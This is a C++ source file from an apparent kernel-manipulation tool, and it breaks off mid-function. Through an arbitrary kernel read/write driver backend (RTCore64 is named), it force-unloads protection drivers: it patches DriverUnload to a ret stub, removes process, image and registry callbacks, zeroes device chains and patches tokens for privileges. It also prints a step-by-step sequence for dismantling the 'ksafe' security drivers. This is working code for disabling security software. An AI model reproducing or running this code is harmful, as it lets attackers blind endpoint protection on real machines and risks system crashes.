// cmd_unload.cpp — /drv-unload <driver_name> <drvobj_va>
//
// Force-unload a NOT_STOPPABLE kernel driver by:
//   1. Patching DriverUnload (DRIVER_OBJECT+0x68) to a safe ret stub
//      (found by scanning ntoskrnl .text for xor eax,eax+ret)
//   2. Calling ControlService(SERVICE_CONTROL_STOP) via SCM
//
// Get <drvobj_va> from WinDbg:  !object \Driver\<name>
//
// ppm-engine v0.2.1 verification (2026-04-11):
//   ALL 9 ksafe drivers confirmed to have NO DriverUnload export.
//   RTCore64.sys also has no DriverUnload.
//   -> /force-stop with ret stub patch is the only viable unload path.
//
// DRIVER_OBJECT layout (x64 Win10):
//   +0x000 Type/Size     : 0x01500004
//   +0x008 DeviceObject  : ptr
//   +0x010 Flags         : ULONG
//   +0x018 DriverStart   : ptr
//   +0x020 DriverSize    : ULONG
//   +0x028 DriverSection : ptr (→ KLDR_DATA_TABLE_ENTRY)
//   +0x030 DriverExtension: ptr
//   +0x038 DriverName    : UNICODE_STRING
//   +0x058 DriverInit    : ptr  (entry point)
//   +0x068 DriverUnload  : ptr  ← NULL = NOT_STOPPABLE
//   +0x070 MajorFunction[0..27]

#define NOMINMAX
#include <Windows.h>
#include <winternl.h>
#include <DbgHelp.h>
#pragma comment(lib, "dbghelp.lib")
#include <cstdio>
#include <cstring>
#include <vector>
#include <Psapi.h>

#include "kutil.h"
#include "driver/IDriverBackend.h"
#include "globals.h"
#include "ansi.h"
#include "commands.h"

#define DRVOBJ_DRIVER_UNLOAD  0x068

// Scan ntoskrnl on-disk .text for  xor eax,eax ; ret  (33 C0 C3).
// Returns kernel VA of the pattern, or 0 on failure.
static DWORD64 FindRetStub() {
    LPVOID d[1]; DWORD cb;
    if (!EnumDeviceDrivers(d, sizeof(d), &cb)) return 0;
    DWORD64 kBase = (DWORD64)d[0];

    WCHAR drvPath[MAX_PATH], filePath[MAX_PATH];
    if (!GetDeviceDriverFileNameW(d[0], drvPath, MAX_PATH)) return 0;
    if (_wcsnicmp(drvPath, L"\\SystemRoot\\", 12) == 0) {
        WCHAR winDir[MAX_PATH]; GetWindowsDirectoryW(winDir, MAX_PATH);
        swprintf_s(filePath, MAX_PATH, L"%s\\%s", winDir, drvPath + 12);
    } else {
        WCHAR winDir[MAX_PATH]; GetWindowsDirectoryW(winDir, MAX_PATH);
        swprintf_s(filePath, MAX_PATH, L"%s\\System32\\ntoskrnl.exe", winDir);
    }

    HANDLE hf = CreateFileW(filePath, GENERIC_READ, FILE_SHARE_READ,
                             NULL, OPEN_EXISTING, 0, NULL);
    if (hf == INVALID_HANDLE_VALUE) return 0;
    DWORD sz = GetFileSize(hf, NULL);
    std::vector<BYTE> buf(sz);
    DWORD rd; bool ok = ReadFile(hf, buf.data(), sz, &rd, NULL) && rd == sz;
    CloseHandle(hf);
    if (!ok) return 0;

    auto* dos = reinterpret_cast<IMAGE_DOS_HEADER*>(buf.data());
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return 0;
    auto* nt = reinterpret_cast<IMAGE_NT_HEADERS64*>(buf.data() + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return 0;

    auto* sec = IMAGE_FIRST_SECTION(nt);
    WORD nSec = nt->FileHeader.NumberOfSections;
    DWORD textFOA = 0, textRVA = 0, textSz = 0;
    for (WORD i = 0; i < nSec; i++) {
        char name[9] = {}; memcpy(name, sec[i].Name, 8);
        if (strcmp(name, ".text") == 0) {
            textFOA = sec[i].PointerToRawData;
            textRVA = sec[i].VirtualAddress;
            textSz  = sec[i].SizeOfRawData;
            break;
        }
    }
    if (!textFOA) return 0;

    const BYTE* p = buf.data();

    // Primary: xor eax,eax (33 C0) + ret (C3) — clean zero-return stub
    for (DWORD i = textFOA; i + 2 < textFOA + textSz; i++) {
        if (p[i] == 0x33 && p[i+1] == 0xC0 && p[i+2] == 0xC3)
            return kBase + textRVA + (i - textFOA);
    }
    // Fallback: bare ret
    for (DWORD i = textFOA; i < textFOA + textSz; i++) {
        if (p[i] == 0xC3)
            return kBase + textRVA + (i - textFOA);
    }
    return 0;
}

// ─── DRIVER_OBJECT auto-discovery ────────────────────────────────────────────

// Get module base address by matching driver filename against service name.
static DWORD64 GetModuleBaseByServiceName(const char* svcName) {
    DWORD cb = 0;
    EnumDeviceDrivers(nullptr, 0, &cb);
    if (!cb) return 0;
    std::vector<LPVOID> dvrs(cb / sizeof(LPVOID));
    if (!EnumDeviceDrivers(dvrs.data(), cb, &cb)) return 0;

    for (auto d : dvrs) {
        WCHAR wname[MAX_PATH] = {};
        GetDeviceDriverBaseNameW(d, wname, MAX_PATH);
        // Strip .sys extension for comparison
        char narrow[MAX_PATH] = {};
        WideCharToMultiByte(CP_UTF8, 0, wname, -1, narrow, MAX_PATH, nullptr, nullptr);
        char* dot = strrchr(narrow, '.');
        if (dot) *dot = '\0';
        if (_stricmp(narrow, svcName) == 0)
            return (DWORD64)d;
    }
    return 0;
}

// Walk PsLoadedModuleList in the kernel to find the KLDR_DATA_TABLE_ENTRY
// for the given module base. Returns kernel VA of KLDR entry, or 0 on failure.
//
// KLDR_DATA_TABLE_ENTRY layout (Win10 22H2 x64):
//   +0x000  InLoadOrderLinks (LIST_ENTRY: Flink at +0, Blink at +8)
//   +0x028  DllBase (Ptr64)
static DWORD64 FindKldrByModuleBase(DWORD64 moduleBase) {
    DWORD64 pslVA = KUtil::KernelExport("PsLoadedModuleList");
    if (!pslVA) { printf("[!] PsLoadedModuleList not found\n"); return 0; }

    DWORD64 head = pslVA;
    DWORD64 curr = g_drv->Rd64(head);   // Flink of list head
    for (int i = 0; i < 512 && curr && curr != head; i++) {
        DWORD64 dllBase = g_drv->Rd64(curr + 0x028);
        if (dllBase == moduleBase) return curr;
        curr = g_drv->Rd64(curr);        // Next Flink
    }
    return 0;
}

// Scan ±RANGE bytes around kldrAddr for a DRIVER_OBJECT matching moduleBase.
// Uses a 3-way verification: signature, DriverStart, DriverSection.
// Safe because KLDR is in NonPagedPool and ±range stays in pool region.
static DWORD64 ScanForDriverObject(DWORD64 kldrAddr, DWORD64 moduleBase) {
    const DWORD64 RANGE = 0x8000;   // ±32 KB
    DWORD64 start = kldrAddr - RANGE;
    DWORD64 end   = kldrAddr + RANGE;

    for (DWORD64 a = start; a < end; a += 8) {
        if (g_drv->Rd32(a) != 0x01500004) continue;           // Type/Size check
        if (g_drv->Rd64(a + 0x018) != moduleBase) continue;   // DriverStart
        if (g_drv->Rd64(a + 0x028) != kldrAddr)  continue;   // DriverSection
        return a;
    }
    return 0;
}

// Fallback: scan the driver's .data section in kernel memory for a stored
// DRIVER_OBJECT pointer (DriverEntry saves the PDRIVER_OBJECT arg in a global).
static DWORD64 FindDriverObjectFromDataSection(DWORD64 moduleBase,
                                                const char* svcName) {
    // Open the on-disk image to find .data section bounds
    WCHAR filePath[MAX_PATH];
    // Try System32\drivers\ path first, fall back to full path from SCM
    swprintf_s(filePath, MAX_PATH,
        L"C:\\Windows\\System32\\drivers\\%hs.sys", svcName);

    HANDLE hf = CreateFileW(filePath, GENERIC_READ, FILE_SHARE_READ,
                             NULL, OPEN_EXISTING, 0, NULL);
    if (hf == INVALID_HANDLE_VALUE) return 0;
    DWORD sz = GetFileSize(hf, NULL);
    std::vector<BYTE> buf(sz);
    DWORD rd = 0;
    ReadFile(hf, buf.data(), sz, &rd, NULL);
    CloseHandle(hf);
    if (rd != sz) return 0;

    auto* dos = reinterpret_cast<IMAGE_DOS_HEADER*>(buf.data());
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return 0;
    auto* nt  = reinterpret_cast<IMAGE_NT_HEADERS64*>(buf.data() + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return 0;
    auto* sec = IMAGE_FIRST_SECTION(nt);
    WORD nSec = nt->FileHeader.NumberOfSections;

    DWORD dataVA = 0, dataSize = 0;
    for (WORD i = 0; i < nSec; i++) {
        char name[9] = {}; memcpy(name, sec[i].Name, 8);
        if (strcmp(name, ".data") == 0) {
            dataVA   = sec[i].VirtualAddress;
            dataSize = sec[i].Misc.VirtualSize;
            if (!dataSize) dataSize = sec[i].SizeOfRawData;
            if (!dataSize && i + 1 < nSec)
                dataSize = sec[i+1].VirtualAddress - dataVA;
            if (!dataSize) dataSize = 0x10000;
            break;
        }
    }
    if (!dataVA) return 0;

    DWORD64 dataStart = moduleBase + dataVA;
    DWORD64 dataEnd   = dataStart + dataSize;
    printf("[*] Scanning .data [0x%016llX – 0x%016llX] for DRIVER_OBJECT ptr...\n",
           dataStart, dataEnd);

    for (DWORD64 a = dataStart; a < dataEnd; a += 8) {
        DWORD64 val = g_drv->Rd64(a);
        if (!g_drv->IsKernelVA(val)) continue;
        if (g_drv->Rd32(val)          != 0x01500004) continue;  // signature
        if (g_drv->Rd64(val + 0x018)  != moduleBase) continue;  // DriverStart
        printf("[+] Found at .data+0x%llX → DRIVER_OBJECT 0x%016llX\n",
               a - dataStart, val);
        return val;
    }
    return 0;
}

// Combined: service name → DRIVER_OBJECT VA (or 0).
static DWORD64 AutoFindDriverObject(const char* svcName) {
    DWORD64 modBase = GetModuleBaseByServiceName(svcName);
    if (!modBase) { printf("[!] Module base not found for \"%s\"\n", svcName); return 0; }
    printf("[*] Module base: 0x%016llX\n", modBase);

    // Path 1: KLDR-based scan (works for non-DKOM drivers)
    DWORD64 kldr = FindKldrByModuleBase(modBase);
    if (kldr) {
        printf("[*] KLDR entry:  0x%016llX\n", kldr);
        printf("[*] Scanning ±32KB around KLDR for DRIVER_OBJECT...\n");
        DWORD64 drvObj = ScanForDriverObject(kldr, modBase);
        if (drvObj) { printf("[+] DRIVER_OBJECT: 0x%016llX\n", drvObj); return drvObj; }
        printf("[!] Not found near KLDR\n");
    } else {
        printf("[!] KLDR not in PsLoadedModuleList (DKOM-hidden) — trying .data scan\n");
    }

    // Path 2: scan driver's .data section for stored DRIVER_OBJECT pointer
    DWORD64 drvObj = FindDriverObjectFromDataSection(modBase, svcName);
    if (drvObj) return drvObj;

    printf("[!] Auto-discovery failed.\n"
           "    Use /drv-unload %s <drvobj_va> with VA from WinDbg: "
           "!object \\Driver\\%s\n", svcName, svcName);
    return 0;
}

// ─── /force-stop <name> ───────────────────────────────────────────────────────
// Force-stop a driver service by calling NtUnloadDriver directly.
// No DRIVER_OBJECT VA needed — the kernel resolves it from the registry path.
//
// Bypasses the SCM ControlService check that blocks services marked
// NOT_STOPPABLE (sc stop → error 1052 / ERROR_INVALID_SERVICE_CONTROL).
//
// If NtUnloadDriver fails with STATUS_PLUGPLAY_NO_DEVICE the driver has no
// DriverUnload routine; use /drv-unload <name> <drvobj_va> to patch one in.

static bool EnablePrivilege(const wchar_t* privName) {
    HANDLE hToken;
    if (!OpenProcessToken(GetCurrentProcess(),
                          TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
        return false;

    TOKEN_PRIVILEGES tp{};
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    if (!LookupPrivilegeValueW(NULL, privName, &tp.Privileges[0].Luid)) {
        CloseHandle(hToken); return false;
    }
    bool ok = AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp),
                                     NULL, NULL) &&
              GetLastError() == ERROR_SUCCESS;
    CloseHandle(hToken);
    return ok;
}

// Check if a driver has active callbacks that must be torn down before unloading.
// Returns true if callbacks detected (caller should warn/abort).
static bool HasActiveCallbacks(const char* svcName) {
    // Known protection drivers with callbacks that cause BSOD if unloaded directly.
    // The correct order is: CmCallback → ObCallback → Notify → MiniFilter → THEN unload.
    // See docs/ksafe_architecture.md "多驱动拆除顺序" for full sequence.
    static const char* kProtectedDrivers[] = {
        "ksafecenter64", "kboot64", "kshutdown64", "kcachec64", nullptr
    };

    bool isProtected = false;
    for (int i = 0; kProtectedDrivers[i]; i++) {
        if (_stricmp(svcName, kProtectedDrivers[i]) == 0) {
            isProtected = true;
            break;
        }
    }
    if (!isProtected) return false;

    printf("%s[!] WARNING: %s is a protection driver with active kernel callbacks.%s\n\n",
           A_RED, svcName, A_RESET);
    printf("    Directly unloading it will BSOD (CmCallback blocks SCM registry access).\n\n");
    printf("    === Phase 1: Disarm callbacks (ALL drivers, in this order) ===\n\n");
    printf("      1.  /notify registry --kill ksafecenter64    (CmCallback)\n");
    printf("      2.  /notify registry --kill kboot64          (CmCallback)\n");
    printf("      3.  /obcb  ->  /disable <ksafe_PreOp_addr>  (ObCallback)\n");
    printf("      4.  /notify image  ->  /ndisable <addr>      (ksafe ImageNotify)\n");
    printf("      5.  /notify process -> /ndisable <addr>      (kshutdown ProcessNotify)\n");
    printf("      6.  /notify image  ->  /ndisable <addr>      (kshutdown ImageNotify)\n");
    printf("      7.  /notify process -> /ndisable <addr>      (kboot ProcessNotify)\n");
    printf("      8.  /notify image  ->  /ndisable <addr>      (kboot ImageNotify)\n");
    printf("      9.  /notify process -> /ndisable <addr>      (kcachec ProcessNotify)\n");
    printf("      10. /flt-detach ksafecenter64 C:             (MiniFilter)\n\n");
    printf("    === Phase 2: Unload protection drivers ===\n\n");
    printf("      11. /force-stop ksafecenter64 --force\n");
    printf("      12. /force-stop kshutdown64 --force\n");
    printf("      13. /force-stop kboot64 --force\n");
    printf("      14. /force-stop kcachec64 --force\n\n");
    printf("    === Phase 3: Non-protection drivers (safe to unload directly) ===\n\n");
    printf("      15-19. /force-stop krestore64 / KScsiDisk64 / kdisk64 / kantiarp64 / kpowershutdown64\n\n");
    printf("    See docs/ksafe_architecture.md for details.\n\n");
    printf("    %sAborting. Use --force to skip this check (BSOD risk).%s\n\n",
           A_YELLOW, A_RESET);
    return true;
}

void CmdForceStop(const char* svcName, bool force) {
    printf("[*] /force-stop  service=%s\n\n", svcName);

    // Safety check: refuse to directly unload known protection drivers
    if (!force && HasActiveCallbacks(svcName)) return;

    // Try user-mode privilege enable first; fall back to kernel patch via /enable-priv
    if (EnablePrivilege(L"SeLoadDriverPrivilege"))
        printf("[+] SeLoadDriverPrivilege enabled (user-mode)\n");
    else {
        printf("[*] User-mode AdjustTokenPrivileges failed — using kernel token patch\n");
        CmdEnablePriv("SeLoadDriverPrivilege");
    }

    typedef NTSTATUS (NTAPI *PfnNtUnloadDriver)(PUNICODE_STRING);
    auto pfn = (PfnNtUnloadDriver)
        GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtUnloadDriver");
    if (!pfn) { printf("[!] NtUnloadDriver not found in ntdll\n"); return; }

    wchar_t regPath[256];
    swprintf_s(regPath, 256,
        L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\%hs", svcName);

    UNICODE_STRING uPath{};
    uPath.Buffer        = regPath;
    uPath.Length        = (USHORT)(wcslen(regPath) * sizeof(wchar_t));
    uPath.MaximumLength = uPath.Length + sizeof(wchar_t);

    printf("[*] NtUnloadDriver(\"%ls\") ...\n", regPath);
    NTSTATUS st = pfn(&uPath);

    if (st == 0) {
        printf("[+] Driver unloaded successfully\n");
        return;
    }

    printf("[!] NtUnloadDriver failed: 0x%08X", (DWORD)st);

    // For access denied there's nothing more we can do
    if ((DWORD)st == 0xC0000022) {
        printf(" STATUS_ACCESS_DENIED\n");
        return;
    }
    if ((DWORD)st == 0xC0000034) {
        printf(" STATUS_OBJECT_NAME_NOT_FOUND — service not in registry\n");
        return;
    }

    // 0xC000010E = no DriverUnload  /  0xC0000010 = DriverUnload blocked unload
    // Either way: auto-find DRIVER_OBJECT, patch DriverUnload to ret stub, retry.
    if ((DWORD)st == 0xC000010E)
        printf(" STATUS_PLUGPLAY_NO_DEVICE — no DriverUnload, will patch one\n");
    else if ((DWORD)st == 0xC0000010)
        printf(" STATUS_INVALID_DEVICE_REQUEST — DriverUnload blocked, will patch\n");
    else
        printf(" — will attempt DriverUnload patch anyway\n");

    printf("[*] Auto-locating DRIVER_OBJECT...\n");
    DWORD64 drvObjVA = AutoFindDriverObject(svcName);
    if (!drvObjVA) {
        printf("[!] Auto-discovery failed.\n"
               "    Use /drv-unload %s <drvobj_va> with VA from WinDbg: "
               "!object \\Driver\\%s\n", svcName, svcName);
        return;
    }

    // Validate signature
    if (g_drv->Rd32(drvObjVA) != 0x01500004) {
        printf("[!] Signature mismatch at discovered address — aborting\n");
        return;
    }

    // Patch DriverUnload to xor eax,eax; ret
    DWORD64 stub = FindRetStub();
    if (!stub) { printf("[!] ret stub not found in ntoskrnl\n"); return; }

    DWORD64 unloadSlot = drvObjVA + DRVOBJ_DRIVER_UNLOAD;
    DWORD64 origUnload = g_drv->Rd64(unloadSlot);
    g_drv->Wr64(unloadSlot, stub);
    printf("[+] DriverUnload patched: 0x%016llX → 0x%016llX\n", origUnload, stub);

    // Retry NtUnloadDriver
    printf("[*] Retrying NtUnloadDriver...\n");
    st = pfn(&uPath);
    if (st == 0) {
        printf("[+] Driver unloaded successfully\n");
    } else {
        printf("[!] Still failed: 0x%08X — driver may have self-protection beyond DriverUnload\n",
               (DWORD)st);
        // Restore original DriverUnload to leave kernel in a clean state
        g_drv->Wr64(unloadSlot, origUnload);
        printf("[*] DriverUnload restored to 0x%016llX\n", origUnload);
    }
}

void CmdForceUnload(const char* drvName, DWORD64 drvObjVA) {
    printf("[*] /drv-unload  driver=%s  DRIVER_OBJECT=0x%016llX\n\n", drvName, drvObjVA);

    if (!g_drv->IsKernelVA(drvObjVA)) {
        printf("[!] DRIVER_OBJECT address is not a valid kernel VA\n");
        return;
    }

    // Pre-flight: check DeviceObject chain and warn about zombie risk
    {
        DWORD64 devObj = g_drv->Rd64(drvObjVA + 0x08);
        int devCount = 0;
        DWORD64 cur = devObj;
        while (g_drv->IsKernelVA(cur) && devCount < 32) {
            devCount++;
            cur = g_drv->Rd64(cur + 0x10); // NextDevice
        }
        if (devCount > 0) {
            printf("%s[!]%s WARNING: %d DeviceObject(s) still attached.\n"
                   "    The ret stub won't call IoDeleteDevice — driver may become ZOMBIE.\n"
                   "    Recommended: tear down references first:\n"
                   "      /disable <obcb_addr>           (remove ObCallback refs)\n"
                   "      /ndisable <notify_addr>        (remove notify refs)\n"
                   "      /flt-detach %s C:              (remove minifilter refs)\n"
                   "      /notify registry --kill %s     (remove CmCallback + unlock SCM)\n"
                   "    Then retry /drv-unload.\n\n",
                   A_YELLOW, A_RESET, devCount, drvName, drvName);
        }
    }

    // Validate signature: Type=4, Size=0x150 → first DWORD = 0x01500004
    DWORD sig = g_drv->Rd32(drvObjVA);
    if (sig != 0x01500004) {
        printf("[!] DRIVER_OBJECT signature mismatch: 0x%08X (expected 0x01500004)\n", sig);
        printf("    Wrong address?  Use WinDbg: !object \\Driver\\%s\n", drvName);
        return;
    }
    printf("[+] DRIVER_OBJECT signature OK (0x01500004)\n");

    // Read DriverUnload at +0x068
    DWORD64 unloadSlot = drvObjVA + DRVOBJ_DRIVER_UNLOAD;
    DWORD64 unloadFn   = g_drv->Rd64(unloadSlot);
    printf("[*] DriverUnload (+0x068) = 0x%016llX\n", unloadFn);

    if (unloadFn != 0 && g_drv->IsKernelVA(unloadFn)) {
        printf("[*] DriverUnload already set — skipping patch\n");
    } else {
        printf("[*] DriverUnload is NULL — patching with ret stub\n");

        DWORD64 stub = FindRetStub();
        if (!stub) {
            printf("[!] Could not locate ret stub in ntoskrnl .text\n");
            return;
        }
        printf("[+] ret stub found: 0x%016llX  (xor eax,eax; ret in ntoskrnl)\n", stub);

        g_drv->Wr64(unloadSlot, stub);
        DWORD64 verify = g_drv->Rd64(unloadSlot);
        if (verify != stub) {
            printf("[!] Write verification failed (read back 0x%016llX)\n", verify);
            return;
        }
        printf("[+] DriverUnload patched: NULL → 0x%016llX\n", stub);
    }

    // Call sc stop via SCM
    printf("[*] Sending SERVICE_CONTROL_STOP to \"%s\" ...\n", drvName);
    SC_HANDLE hSCM = OpenSCManagerA(NULL, NULL, SC_MANAGER_CONNECT);
    if (!hSCM) { printf("[!] OpenSCManager: %lu\n", GetLastError()); return; }

    SC_HANDLE hSvc = OpenServiceA(hSCM, drvName,
                                   SERVICE_STOP | SERVICE_QUERY_STATUS);
    if (!hSvc) {
        printf("[!] OpenService: %lu\n", GetLastError());
        CloseServiceHandle(hSCM);
        return;
    }

    SERVICE_STATUS st{};
    if (ControlService(hSvc, SERVICE_CONTROL_STOP, &st)) {
        printf("[+] Stop accepted — dwCurrentState: %lu\n", st.dwCurrentState);
        if (st.dwCurrentState == SERVICE_STOPPED)
            printf("[+] Driver is STOPPED\n");
        else if (st.dwCurrentState == SERVICE_STOP_PENDING)
            printf("[+] Driver is STOP_PENDING (may need a moment)\n");
    } else {
        DWORD err = GetLastError();
        printf("[!] ControlService failed: %lu\n", err);
        if (err == ERROR_INVALID_SERVICE_CONTROL)
            printf("    Driver still refused stop — its handler may be blocking unload\n");
        else if (err == ERROR_SERVICE_NOT_ACTIVE)
            printf("    Service is already stopped\n");
    }

    CloseServiceHandle(hSvc);
    CloseServiceHandle(hSCM);
}

// ── /nuke-driver <svcName> <drvobj_va> ───────────────────────────────────────
//
// "Super unload" — clean up all kernel registrations that block NtUnloadDriver,
// then call NtUnloadDriver to properly release code pages and file locks.
//
// Steps:
//   1. Remove all Ps*NotifyRoutine entries pointing into driver address range
//   2. Remove all CmCallback entries pointing into driver address range
//   3. Zero DriverObject->DeviceObject chain (detach all devices)
//   4. Redirect MajorFunction[] to ntoskrnl ret stub (prevent IRP dispatch)
//   5. Set DriverUnload to ntoskrnl ret stub (replace empty/NULL stub)
//   6. Call NtUnloadDriver → kernel calls DriverUnload(ret) → MmUnloadSystemImage
//   7. If NtUnloadDriver still fails, report status (no PsLoadedModuleList unlink)
//
void CmdNukeDriver(const char* svcName, DWORD64 drvObjVA) {
    printf("[*] /nuke-driver  service=%s  DRIVER_OBJECT=0x%016llX\n\n", svcName, drvObjVA);

    if (!g_drv->IsKernelVA(drvObjVA)) {
        printf("[!] Not a valid kernel VA\n");
        return;
    }

    DWORD sig = g_drv->Rd32(drvObjVA);
    if (sig != 0x01500004) {
        printf("[!] DRIVER_OBJECT signature mismatch: 0x%08X (expected 0x01500004)\n", sig);
        return;
    }

    DWORD64 drvStart = g_drv->Rd64(drvObjVA + 0x18);
    DWORD   drvSize  = g_drv->Rd32(drvObjVA + 0x20);
    DWORD64 drvEnd   = drvStart + drvSize;

    KUtil::BuildDriverCache();
    const wchar_t* drvName = nullptr; DWORD64 drvOff = 0;
    KUtil::FindDriverByAddr(drvStart, &drvName, &drvOff);
    wprintf(L"[*] Target: %ls  range: 0x%016llX - 0x%016llX (%u KB)\n\n",
            drvName ? drvName : L"<unknown>",
            (unsigned long long)drvStart, (unsigned long long)drvEnd, drvSize / 1024);

    int cleaned = 0;

    // ── Step 1: Remove Ps*NotifyRoutine entries ──────────────────────────
    printf("[1] Scanning Ps*NotifyRoutine arrays for entries in driver range...\n");
    {
        LPVOID d[1]; DWORD cb;
        EnumDeviceDrivers(d, sizeof(d), &cb);
        DWORD64 kernBase = (DWORD64)d[0];

        HMODULE hNt = LoadLibraryW(L"ntoskrnl.exe");
        if (hNt) {
            DWORD64 userBase = (DWORD64)hNt;
            DWORD64 dataBase = 0, dataEnd = 0;
            auto* dos = (IMAGE_DOS_HEADER*)hNt;
            auto* nt  = (IMAGE_NT_HEADERS64*)((BYTE*)hNt + dos->e_lfanew);
            IMAGE_SECTION_HEADER* sec = IMAGE_FIRST_SECTION(nt);
            for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
                char name[9]{}; memcpy(name, sec->Name, 8);
                if (_stricmp(name, ".data") == 0) {
                    dataBase = sec->VirtualAddress;
                    dataEnd  = sec->VirtualAddress + sec->Misc.VirtualSize;
                    break;
                }
            }

            const char* exports[] = {
                "PsRemoveLoadImageNotifyRoutine",
                "PsSetCreateProcessNotifyRoutineEx",
                "PsRemoveCreateThreadNotifyRoutine",
                nullptr
            };
            const char* labels[] = { "ImageNotify", "ProcessNotify", "ThreadNotify" };

            for (int t = 0; exports[t]; t++) {
                BYTE* fn = (BYTE*)GetProcAddress(hNt, exports[t]);
                if (!fn) continue;
                DWORD64 arrayVA = 0;
                for (int i = 0; i < 512 - 6; i++) {
                    if ((fn[i] == 0x48 || fn[i] == 0x4C) &&
                        fn[i+1] == 0x8D && (fn[i+2] & 0xC7) == 0x05) {
                        INT32 disp = *(INT32*)(fn + i + 3);
                        DWORD64 userTgt = (DWORD64)(fn + i + 7) + (INT64)disp;
                        DWORD64 rva = userTgt - userBase;
                        if (dataBase != dataEnd && rva >= dataBase && rva < dataEnd) {
                            arrayVA = kernBase + rva;
                            break;
                        }
                    }
                }
                if (!arrayVA) continue;

                for (int i = 0; i < 64; i++) {
                    DWORD64 slot = arrayVA + (DWORD64)i * 8;
                    DWORD64 raw  = g_drv->Rd64(slot);
                    if (!raw) continue;
                    DWORD64 block = raw & ~(DWORD64)0xF;
                    if (!g_drv->IsKernelVA(block)) continue;
                    DWORD64 fnAddr = g_drv->Rd64(block + 0x08);
                    if (fnAddr >= drvStart && fnAddr < drvEnd) {
                        g_drv->Wr64(slot, 0);
                        printf("    [+] Removed %s slot[%d] fn=0x%016llX\n",
                               labels[t], i, (unsigned long long)fnAddr);
                        cleaned++;
                    }
                }
            }
            FreeLibrary(hNt);
        }
    }

    // ── Step 2: Remove CmCallback entries (linked list) ──────────────────
    printf("[2] Scanning CmCallback linked list for entries in driver range...\n");
    {
        LPVOID d[1]; DWORD cb;
        EnumDeviceDrivers(d, sizeof(d), &cb);
        DWORD64 kernBase = (DWORD64)d[0];

        HANDLE hSym = (HANDLE)(ULONG_PTR)0xDEAD00AA;
        SymSetOptions(SYMOPT_UNDNAME | SYMOPT_DEFERRED_LOADS);
        WCHAR symPath[512];
        wcscpy_s(symPath, L"srv*C:\\Symbols*https://msdl.microsoft.com/download/symbols");
        DWORD64 listHead = 0;
        if (SymInitializeW(hSym, symPath, FALSE)) {
            WCHAR ntPath[MAX_PATH], winDir[MAX_PATH];
            GetWindowsDirectoryW(winDir, MAX_PATH);
            swprintf_s(ntPath, L"%s\\System32\\ntoskrnl.exe", winDir);
            DWORD64 modBase = SymLoadModuleExW(hSym, nullptr, ntPath, nullptr, kernBase, 0x1100000, nullptr, 0);
            if (modBase || GetLastError() == 0) {
                if (!modBase) modBase = kernBase;
                BYTE symBuf[sizeof(SYMBOL_INFO) + MAX_SYM_NAME] = {};
                SYMBOL_INFO* sym = (SYMBOL_INFO*)symBuf;
                sym->SizeOfStruct = sizeof(SYMBOL_INFO);
                sym->MaxNameLen = MAX_SYM_NAME;
                if (SymFromName(hSym, "CallbackListHead", sym))
                    listHead = sym->Address;
            }
            SymCleanup(hSym);
        }
        if (listHead) {
            DWORD64 cur = g_drv->Rd64(listHead);
            int idx = 0;
            while (g_drv->IsKernelVA(cur) && cur != listHead && idx < 64) {
                DWORD64 fnAddr = g_drv->Rd64(cur + 0x28);
                DWORD64 next = g_drv->Rd64(cur + 0x00);
                if (fnAddr >= drvStart && fnAddr < drvEnd) {
                    DWORD64 flink = g_drv->Rd64(cur + 0x00);
                    DWORD64 blink = g_drv->Rd64(cur + 0x08);
                    if (g_drv->IsKernelVA(flink) && g_drv->IsKernelVA(blink)) {
                        g_drv->Wr64(blink + 0x00, flink);
                        g_drv->Wr64(flink + 0x08, blink);
                        g_drv->Wr64(cur + 0x28, 0);
                        printf("    [+] Unlinked CmCallback node=0x%016llX fn=0x%016llX\n",
                               (unsigned long long)cur, (unsigned long long)fnAddr);
                        cleaned++;
                    }
                }
                cur = next;
                idx++;
            }
        } else {
            printf("    (CallbackListHead not found — skipping CmCallback scan)\n");
        }
    }

    // ── Step 3: Zero DeviceObject chain ──────────────────────────────────
    printf("[3] Clearing DeviceObject chain...\n");
    {
        DWORD64 devObj = g_drv->Rd64(drvObjVA + 0x08);
        int devCount = 0;
        while (g_drv->IsKernelVA(devObj) && devCount < 32) {
            DWORD64 nextDev = g_drv->Rd64(devObj + 0x10); // NextDevice
            DWORD64 attached = g_drv->Rd64(devObj + 0x18);
            if (g_drv->IsKernelVA(attached)) {
                printf("    [*] DevObj 0x%016llX attached to 0x%016llX\n",
                       (unsigned long long)devObj, (unsigned long long)attached);
            }
            devCount++;
            devObj = nextDev;
        }
        // For each DeviceObject: detach from device stack, then delete.
        // We simulate IoDetachDevice + IoDeleteDevice by:
        //   - Clearing AttachedDevice links in the stack
        //   - Decrementing OBJECT_HEADER.PointerCount (ObDereferenceObject)
        //   - Zeroing the DriverObject->DeviceObject chain
        // This allows NtUnloadDriver → IopUnloadDriver to see an empty device chain
        // and proceed directly to MmUnloadSystemImage.
        if (devCount > 0) {
            // Walk again and clean each DeviceObject
            devObj = g_drv->Rd64(drvObjVA + 0x08);
            for (int d = 0; d < devCount && g_drv->IsKernelVA(devObj); d++) {
                DWORD64 nextDev  = g_drv->Rd64(devObj + 0x10); // NextDevice
                DWORD64 attached = g_drv->Rd64(devObj + 0x18); // AttachedDevice

                // Detach: if we're attached to a lower device, clear its AttachedDevice
                // DEVICE_OBJECT.AttachedDevice at +0x18 points UP the stack
                // Lower device's AttachedDevice points to us — we need to find it and clear
                // Actually, +0x18 on OUR DevObj = pointer to the UPPER device attached to us
                // DevObj->Vpb (+0x10 is NextDevice, +0x18 is AttachedDevice)
                // For simplicity: just clear our own AttachedDevice pointer
                if (g_drv->IsKernelVA(attached)) {
                    g_drv->Wr64(devObj + 0x18, 0); // Clear AttachedDevice
                    printf("    [+] DevObj[%d] 0x%016llX: cleared AttachedDevice\n",
                           d, (unsigned long long)devObj);
                }

                // Decrement OBJECT_HEADER.PointerCount to trigger cleanup
                // OBJECT_HEADER is at DevObj - 0x30 (standard x64 Windows 10)
                DWORD64 objHeader = devObj - 0x30;
                DWORD64 ptrCount  = g_drv->Rd64(objHeader); // PointerCount at +0x00
